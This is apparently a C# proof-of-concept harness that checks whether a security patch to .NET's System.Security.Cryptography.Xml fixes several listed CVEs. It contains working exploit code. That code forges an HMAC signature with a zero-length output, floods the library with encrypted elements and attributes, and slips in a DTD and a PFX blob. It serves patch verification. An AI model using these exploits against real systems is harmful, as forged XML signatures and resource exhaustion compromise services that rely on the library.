// PoC for System.Security.Cryptography.Xml 8.0.3-sp1. Run against the original 8.0.3 and against 8.0.3-sp1:
// every exploit prints VULNERABLE on 8.0.3 and FIXED on 8.0.3-sp1. The sanity check must pass on both.
using System;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography.Xml;
using System.Text;
using System.Xml;

static class Program
{
    static RSA Rsa;
    static X509Certificate2 Cert;

    static int Main()
    {
        Assembly asm = typeof(SignedXml).Assembly;
        Console.WriteLine($"assembly: {asm.GetName().Name} {asm.GetName().Version} (file {FileVersionInfo.GetVersionInfo(asm.Location).FileVersion})");
        Console.WriteLine($"runtime : {System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription.Trim()} {System.Runtime.InteropServices.RuntimeInformation.ProcessArchitecture}");

        Rsa = RSA.Create(2048);
        Cert = new CertificateRequest("CN=poc", Rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1)
            .CreateSelfSigned(DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(1));

        Sanity();

        // patches/CVE-2026-47302+CVE-2026-47304+CVE-2026-50525+CVE-2026-50527+CVE-2026-50648.patch
        Exploit("CVE-2026-47304 group", "HMAC signature forged with the wrong key (HMACOutputLength=0, unregistered method URL)", "CheckSignature returned false", HmacForgery);
        Exploit("CVE-2026-50525 group", "1000 EncryptedData elements processed by one XmlDecryptionTransform", "number of EncryptedData elements", ManyEncryptedInDecryptionTransform);

        // patches/CVE-2026-96958+CVE-2026-96959+CVE-2026-96960.patch
        Exploit("CVE-2026-96958 group", "DTD with entity expansion inside a signed document", "DTD is prohibited", DtdInSignedDocument);
        Exploit("CVE-2026-96958 group", "600 attributes on one element through C14N", "maximum number of attributes", ManyAttributesC14N);
        Exploit("CVE-2026-96958 group", "300 EncryptedData elements in one DecryptDocument", "number of EncryptedData elements", ManyEncryptedInDecryptDocument);

        // patches/CVE-2026-96222.patch
        Exploit("CVE-2026-96222", "PFX blob accepted as <X509Certificate>", "Malformed element X509Certificate", PfxAsX509Certificate);
        return 0;
    }

    // Legitimate use must keep working on both versions.
    static void Sanity()
    {
        XmlDocument doc = Doc("<order id=\"42\"><item>1</item><secret>s3cr3t</secret></order>");
        var signer = new SignedXml(doc) { SigningKey = Rsa };
        signer.KeyInfo.AddClause(new KeyInfoX509Data(Cert));
        var r = new Reference("");
        r.AddTransform(new XmlDsigEnvelopedSignatureTransform());
        signer.AddReference(r);
        signer.ComputeSignature();
        doc.DocumentElement.AppendChild(doc.ImportNode(signer.GetXml(), true));
        bool verified = Verifier(doc).CheckSignature(Cert, true);

        using Aes aes = Aes.Create();
        var exml = new EncryptedXml(doc);
        exml.AddKeyNameMapping("k", aes);
        var secret = (XmlElement)doc.DocumentElement["secret"];
        EncryptedXml.ReplaceElement(secret, exml.Encrypt(secret, "k"), false);
        XmlDocument rt = Doc(doc.OuterXml);
        var dexml = new EncryptedXml(rt);
        dexml.AddKeyNameMapping("k", aes);
        dexml.DecryptDocument();
        bool ok = verified && rt.DocumentElement["secret"]?.InnerText == "s3cr3t";
        Console.WriteLine($"{(ok ? "OK        " : "BROKEN    ")} sanity               : RSA sign/verify + X509Data + AES encrypt/decrypt");
    }

    // Exploit returns a description when the attack worked. FIXED requires the specific error the sp1 patch
    // introduces (fixMessage); any other exception is reported as ERROR, never as FIXED.
    static void Exploit(string cve, string name, string fixMessage, Func<string> attack)
    {
        var sw = Stopwatch.StartNew();
        string status, detail;
        try { status = "VULNERABLE"; detail = attack(); }
        catch (Exception e) when (e is CryptographicException || e is XmlException)
        {
            bool isFix = e.Message.Contains(fixMessage);
            status = isFix ? "FIXED" : "ERROR";
            detail = isFix ? e.Message.Split(new[] { ". " }, StringSplitOptions.None)[0] : $"{e.GetType().Name}: {e.Message}";
        }
        catch (NullReferenceException) { status = "VULNERABLE"; detail = "unhandled NullReferenceException instead of a bounded CryptographicException"; }
        catch (Exception e) { status = "ERROR"; detail = $"{e.GetType().Name}: {e.Message}"; }
        Console.WriteLine($"{status,-11} {cve,-21}: {name} -> {detail} ({sw.ElapsedMilliseconds} ms)");
    }

    static string HmacForgery()
    {
        // Attacker builds the document and "signs" it with their own key, a zero-length HMAC and a
        // SignatureMethod URL the default format validator doesn't recognise as HMAC.
        var data = new XmlDocument();
        data.LoadXml("<Data>transfer 1000000 to attacker</Data>");
        var builder = new SignedXml();
        builder.SignedInfo.CanonicalizationMethod = SignedXml.XmlDsigC14NTransformUrl;
        builder.AddObject(new DataObject { Id = "object", Data = data.ChildNodes });
        builder.AddReference(new Reference { Uri = "#object", DigestMethod = SignedXml.XmlDsigSHA256Url });
        builder.SignedInfo.SignatureLength = "0";
        using (var attackerKey = new HMACSHA256(Encoding.UTF8.GetBytes("attacker-key")))
            builder.ComputeSignature(attackerKey);
        builder.SignedInfo.SignatureMethod = "urn:example:not-a-registered-hmac-url";

        var doc = new XmlDocument();
        doc.AppendChild(doc.ImportNode(builder.GetXml(), true));
        var verifier = new SignedXml(doc);
        verifier.LoadXml(doc.DocumentElement);
        // Victim verifies with its real secret, which the attacker never had.
        using var victimKey = new HMACSHA256(Encoding.UTF8.GetBytes("victim-secret"));
        if (!verifier.CheckSignature(victimKey))
            throw new CryptographicException("CheckSignature returned false");
        return "CheckSignature(victim key) = True";
    }

    static string ManyEncryptedInDecryptionTransform()
    {
        using Aes aes = Aes.Create();
        XmlDocument doc = Doc("<root><payloads/></root>");
        XmlElement payloads = (XmlElement)doc.DocumentElement.FirstChild;
        AppendEncrypted(doc, payloads, aes, "signed-payload");
        var signer = new SignedXml(doc) { SigningKey = Rsa };
        signer.EncryptedXml.AddKeyNameMapping("aes", aes);
        var r = new Reference("");
        r.AddTransform(new XmlDsigEnvelopedSignatureTransform());
        r.AddTransform(new XmlDecryptionTransform());
        signer.AddReference(r);
        signer.ComputeSignature();
        doc.DocumentElement.AppendChild(doc.ImportNode(signer.GetXml(), true));
        payloads.RemoveAll();
        for (int i = 0; i < 1000; i++) AppendEncrypted(doc, payloads, aes, "payload-" + i);

        var verifier = Verifier(doc);
        verifier.EncryptedXml.AddKeyNameMapping("aes", aes);
        return $"all 1000 decrypted, CheckSignature = {verifier.CheckSignature(Rsa)}";
    }

    static string DtdInSignedDocument() =>
        SignAndVerify(Doc("<!DOCTYPE root [<!ENTITY e \"expanded\">]><root>&e;</root>"));

    static string ManyAttributesC14N() =>
        SignAndVerify(Doc("<root" + string.Concat(Enumerable.Range(0, 600).Select(i => $" a{i}=\"{i}\"")) + ">x</root>"));

    static string ManyEncryptedInDecryptDocument()
    {
        XmlDocument doc = Doc("<root>" + string.Concat(Enumerable.Range(0, 300).Select(i => $"<s>{i}</s>")) + "</root>");
        using Aes aes = Aes.Create();
        foreach (XmlElement el in doc.DocumentElement.ChildNodes.OfType<XmlElement>().ToList())
            AppendEncrypted(doc, doc.DocumentElement, aes, el.InnerText, el);
        XmlDocument rt = Doc(doc.OuterXml);
        var d = new EncryptedXml(rt);
        d.AddKeyNameMapping("aes", aes);
        d.DecryptDocument();
        return $"all {rt.DocumentElement.ChildNodes.Count} decrypted";
    }

    static string PfxAsX509Certificate()
    {
        byte[] pfx = new X509Certificate2Collection(new X509Certificate2(Cert.RawData)).Export(X509ContentType.Pfx);
        XmlDocument doc = Doc($"<X509Data xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><X509Certificate>{Convert.ToBase64String(pfx)}</X509Certificate></X509Data>");
        var data = new KeyInfoX509Data();
        data.LoadXml(doc.DocumentElement);
        return $"loaded {data.Certificates.Count} certificate from a PFX";
    }

    static XmlDocument Doc(string xml)
    {
        var d = new XmlDocument { PreserveWhitespace = true };
        d.LoadXml(xml);
        return d;
    }

    static SignedXml Verifier(XmlDocument doc)
    {
        XmlDocument reloaded = Doc(doc.OuterXml);
        var v = new SignedXml(reloaded);
        v.LoadXml((XmlElement)reloaded.GetElementsByTagName("Signature", SignedXml.XmlDsigNamespaceUrl)[0]);
        return v;
    }

    static string SignAndVerify(XmlDocument doc)
    {
        var signer = new SignedXml(doc) { SigningKey = Rsa };
        var r = new Reference("");
        r.AddTransform(new XmlDsigEnvelopedSignatureTransform());
        signer.AddReference(r);
        signer.ComputeSignature();
        doc.DocumentElement.AppendChild(doc.ImportNode(signer.GetXml(), true));
        return $"signed and verified = {Verifier(doc).CheckSignature(Rsa)}";
    }

    static void AppendEncrypted(XmlDocument doc, XmlElement parent, SymmetricAlgorithm aes, string value, XmlElement existing = null)
    {
        XmlElement clear = existing ?? doc.CreateElement("clear");
        clear.InnerText = value;
        if (existing == null) parent.AppendChild(clear);
        var exml = new EncryptedXml(doc);
        exml.AddKeyNameMapping("aes", aes);
        EncryptedXml.ReplaceElement(clear, exml.Encrypt(clear, "aes"), false);
    }
}
